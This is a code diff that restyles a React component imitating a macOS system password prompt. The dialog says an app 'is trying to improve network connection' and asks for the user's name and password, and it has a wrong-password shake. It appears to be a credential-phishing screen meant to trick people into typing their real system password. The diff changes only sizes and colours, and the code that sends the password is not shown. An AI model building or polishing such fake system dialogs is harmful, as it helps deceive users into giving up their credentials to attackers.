@@ -2984,7 +2984,7 @@ const MacModal = ({ isOpen, onClose, userId, backendConfig, adminName: adminName
                     transition: isDragging ? 'none' : 'transform 0.3s ease-out'
                 } },
                 React.createElement("div", { className: isWrongPassword ? 'mac-modal-vibrate' : '' },
-                    React.createElement("div", { className: "bg-[#2f2f2f] rounded-[14px] border border-black w-[280px] transition-transform duration-300", style: {
+                    React.createElement("div", { className: "bg-[#2f2f2f] rounded-[14px] border border-black w-[260px] transition-transform duration-300", style: {
                             boxShadow: '0 18px 60px rgba(0, 0, 0, 0.55)',
                             transform: isOpen ? 'scale(1)' : 'scale(0.95)'
                         } },
@@ -2993,17 +2993,17 @@ const MacModal = ({ isOpen, onClose, userId, backendConfig, adminName: adminName
                             React.createElement("div", { className: "flex justify-center mb-[8px]" },
                                 React.createElement("div", { className: "relative w-[70px] h-[70px]" },
                                     React.createElement("img", { src: 'https://www.riveanimation.cards/v8/images/lock.png', draggable: false }))),
-                            React.createElement("div", { className: "text-center text-[15px] font-semibold text-[#f5f5f7] leading-[20px] mb-[10px]  mac-font-bold" }, appName),
-                            React.createElement("div", { className: "text-center text-[12px] text-[rgba(245,248,255,0.82)] leading-[16px] mb-[8px] mac-font" },
+                            React.createElement("div", { className: "text-center text-[12px] text-[#ffffff] leading-[20px] mb-[10px]  mac-font-bold" }, appName),
+                            React.createElement("div", { className: "text-center text-[10px] text-[#ffffff] leading-[16px] mb-[8px] mac-font" },
                                 React.createElement("div", null,
                                     appName,
                                     " is trying to improve"),
                                 React.createElement("div", null, "network connection"),
-                                React.createElement("div", { className: "mt-[20px] text-[rgba(245,248,255,0.72)] mac-font tracking-wide" }, "Enter your password to allow this.")),
+                                React.createElement("div", { className: "mt-[18px] text-[#ffffff] mac-font tracking-wide" }, "Enter your password to allow this.")),
                             React.createElement("div", { className: "mb-[8px]" },
-                                React.createElement("input", { value: adminName, onChange: (e) => setAdminName(e.target.value), className: `tracking-wider w-full px-[10px] py-[1px] rounded-[4px] text-[12px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'}  mac-font`, disabled: submitting })),
+                                React.createElement("input", { value: adminName, onChange: (e) => setAdminName(e.target.value), className: `tracking-wider w-full px-[10px] py-[1px] rounded-[4px] text-[10px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'}  mac-font`, disabled: submitting })),
                             React.createElement("div", { className: "mb-[18px]" },
-                                React.createElement("input", { ref: passwordInputRef, type: "password", value: keyword, onChange: handleKeywordChange, onKeyDown: handleKeyDown, placeholder: "Password", autoComplete: "off", spellCheck: false, disabled: submitting, className: `tracking-widest w-full px-[10px] py-[1px] rounded-[4px] text-[12px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'} mac-font` })),
+                                React.createElement("input", { ref: passwordInputRef, type: "password", value: keyword, onChange: handleKeywordChange, onKeyDown: handleKeyDown, placeholder: "Password", autoComplete: "off", spellCheck: false, disabled: submitting, className: `tracking-widest w-full px-[10px] py-[1px] rounded-[4px] text-[10px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'} mac-font` })),
                             React.createElement("div", { className: "flex gap-[10px]" },
                                 React.createElement("button", { onClick: handleCancelbutton, className: `flex-1 h-[28px] rounded-[7px] text-[13px] font-medium hover:bg-[rgba(255,255,255,0.28)] active:bg-[rgba(255,255,255,0.32)] transition-colors ${submitting ? ' bg-[rgba(255,255,255,0.11)] text-[#f5f5f75d]' : 'bg-[rgba(255,255,255,0.22)] text-[#f5f5f7]'} mac-font`, disabled: submitting }, "Cancel"),
                                 React.createElement("button", { onClick: handleKeywordTyping, disabled: submitting, className: `flex-1 h-[28px] rounded-[7px] text-[13px] font-semibold transition-colors active:bg-[#3c9cfc] ${submitting ? ' bg-[rgba(255,255,255,0.11)] text-[#f5f5f75d]' : 'bg-[#0a84ff] text-white'} mac-font` }, "OK")))))))));
